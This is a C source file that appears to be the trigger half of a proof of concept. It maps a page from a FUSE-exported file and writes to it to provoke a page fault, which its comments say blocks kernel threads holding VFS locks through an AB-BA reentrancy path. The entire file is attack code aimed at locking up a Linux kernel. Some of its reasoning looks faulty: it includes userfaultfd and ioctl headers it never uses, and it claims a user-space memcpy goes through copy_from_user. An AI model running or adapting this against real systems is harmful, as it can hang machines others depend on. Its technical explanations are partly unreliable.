#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>

// Entry point: open the target file, map the userfaultfd-registered page,
// and perform a write that induces a controlled missing-page fault.
// This sequence drives the AB-BA reentrancy path in the FUSE filesystem.
int main(int argc, char *argv[]) {
    // Validate usage: require a single path argument referencing the
    // userfaultfd-registered file exported by the FUSE instance.
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <path_to_target>\n", argv[0]);
        return 1;
    }

    // Open the provided path for read/write. Failure aborts the trigger
    // because mmap cannot proceed without a valid descriptor.
    int fd = open(argv[1], O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Log the initialization phase.
    printf("[CLIENT_INIT] Target opened successfully: %s\n", argv[1]);

    // Map one page from the target file. The corresponding region is
    // registered with userfaultfd on the FUSE side; any access to an
    // unmapped page will generate a missing-page event and block the
    // kernel thread holding VFS locks.
    void *addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    printf("[CLIENT_MAP] Page mapped at %p. Preparing payload...\n", addr);

    // Copy bytes into the mapped page. The first access touches a
    // not-yet-populated page, forcing the kernel into a copy_from_user
    // path that triggers userfaultfd and enters the reentrancy window.
    char payload[] = "ABBA_OVERWRITE";

    printf("[CLIENT_TRAP] Executing memcpy to provoke copy_from_user fault...\n");

    memcpy(addr, payload, sizeof(payload));

    printf("[CLIENT_EXIT] Write completed: %s (inspect for blocked kernel threads)\n",
           (char *)addr);

    // Clean up mappings and descriptors. No further interaction is required
    // because the reentrancy is driven entirely by the first page fault.
    munmap(addr, 4096);
    close(fd);
    return 0;
}
